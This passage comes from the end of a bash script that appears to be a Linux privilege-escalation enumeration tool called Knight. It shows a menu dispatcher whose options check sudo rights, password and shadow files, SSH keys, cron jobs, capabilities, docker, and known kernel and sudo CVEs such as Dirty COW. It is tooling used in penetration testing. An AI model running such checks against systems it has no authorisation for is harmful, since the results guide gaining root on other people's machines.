        "check_CVE_2023_26604" \
        "Shellshock_vulnerability_check" \
        "check_CVE_2016_0728" \
        "check_CVE_2016_1531" \
        "check_CVE_2010_0426" \
        "check-2023-22809" \
        "exit"

        do
            if [ -z "$answer" ]; then
                echo -e "\n${BPurple}Invalid option.${NC} Please choose a valid option from the menu."
                continue
            fi

            if [ "$answer" = "exit" ]; then
                exit_program
            fi

            case $answer in
                Sudo)
                    Sudo;;
                tty_shell)
                    tty_shell;;
                passwd_shadow)
                    passwd_shadow;;
                whoisthis)
                    whoisthis;;
                capabilities)
                    capabilities;;
                cronjobs)
                    cronjobs;;
                keys_ssh)
                    keys_ssh;;
                docker)
                    dker;;
                bash_history)
                    bash_history;;
                check_writable_dirs)
                    check_writable_dirs;;
                config_code)
                    config_code;;
                hidden_service_and_network)
                    hidden_service_and_network;;
                NFS_shares)
                    nfs;;
                check_gtfobins)
                    check_gtfobins;;
                console_clear)
                    console_clear;;
                search_wordpress_config)
                    search_wordpress_config;;
                check_logrotten)
                    check_logrotten_vulnerability;;
                check_dirty_cow)
                    check_dirty_cow_vulnerability;;
                check_CVE_2023_26604)
                    check_CVE_2023_26604;;
                Shellshock_vulnerability_check)
                    check_shellshock;;
                check_CVE_2016_0728)
                    check_CVE_2016_0728;;
                check_CVE_2016_1531)
                    check_CVE_2016_1531;;
                check_CVE_2010_0426)
                    check_CVE_2010_0426;;
                check-2023-22809)
                    check-2023-22809;;
                docker-scan)
                    docker-scan;;
            esac    
        done
    done
}

# Check command line arguments
if [ "${1}" = "--help" ] || [ "${1}" = "-h" ]
then
    show_help
elif [ "${1}" = "--version" ] || [ "${1}" = "-v" ]
then
    show_version
    echo -e "\e[3m${BBlue}May the strength of sudoers be with you${NC}\e[0m"

else
    echo -e "\n[${BPurple}+${NC}] Knight-v(${BPurple}4.5.8${NC}) ${BPurple}initialzing${NC} on ${BPurple}$(uname -a | awk '{print $2}')${NC} at $(date +%T)\n"
    # Initialize Knight
    main
fi